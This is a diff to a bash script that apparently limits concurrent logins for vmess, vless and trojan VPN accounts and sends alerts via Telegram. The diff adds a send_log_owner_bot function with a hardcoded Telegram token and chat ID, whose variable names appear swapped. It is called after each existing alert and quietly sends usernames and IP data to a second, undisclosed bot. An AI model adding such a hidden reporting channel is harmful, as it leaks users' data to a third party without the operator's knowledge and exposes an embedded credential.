@@ -10,10 +10,25 @@ TEXT="
 <b>⚠️ NOTIFICATIONS MULTI LOGIN ⚠️</b>
 <code>────────────────────</code>
 <code>Username  : </code><code>$user</code>
-<code>Limit Ip    : </code><code>$data</code>
+<code>Limit Ip  : </code><code>$data</code>
 <code>────────────────────</code>
 "
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
+function send_log_owner_bot() {
+CHATIDX="6386703502:AAGiUjNES9aXxBWzuqNTiqDBDqd0uLcGFAs"
+KEYX="5795571992"
+TIME="10"
+URLX="https://api.telegram.org/bot$KEYX/sendMessage"
+TEXT="
+<code>────────────────────</code>
+<b>⚠️ NOTIFICATIONS MULTI LOGIN ⚠️</b>
+<code>────────────────────</code>
+<code>Username  : </code><code>$user</code>
+<code>Limit Ip  : </code><code>$data</code>
+<code>────────────────────</code>
+"
+curl -s --max-time $TIME -d "chat_id=$CHATIDX&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URLX >/dev/null
 }
 function vmip(){
 #LIMITVMESSIP
@@ -34,6 +49,7 @@ data=( `ls /etc/kyt/limit/vmess/ip`);
                   jum2=$(cat /tmp/ipvmess.txt | wc -l)
                   rm -rf /etc/kyt/limit/vmess/ip/$user
                   send_log
+                  send_log_owner_bot
                 else
             echo ""
         fi
@@ -59,6 +75,7 @@ data=( `ls /etc/kyt/limit/vless/ip`);
                   jum2=$(cat /tmp/ipvless.txt | wc -l)
                   rm -rf /etc/kyt/limit/vless/ip/$user
                   send_log
+                  send_log_owner_bot
                 else
             echo ""
         fi
@@ -84,6 +101,7 @@ data=( `ls /etc/kyt/limit/trojan/ip`);
                   jum2=$(cat /tmp/iptrojan.txt | wc -l)
                   rm -rf /etc/kyt/limit/trojan/ip/$user
                   send_log
+                  send_log_owner_bot
                 else
             echo ""
         fi
@@ -98,7 +116,3 @@ vlip
 elif [[ ${1} == "trip" ]]; then
 trip
 fi
-
-
-
-
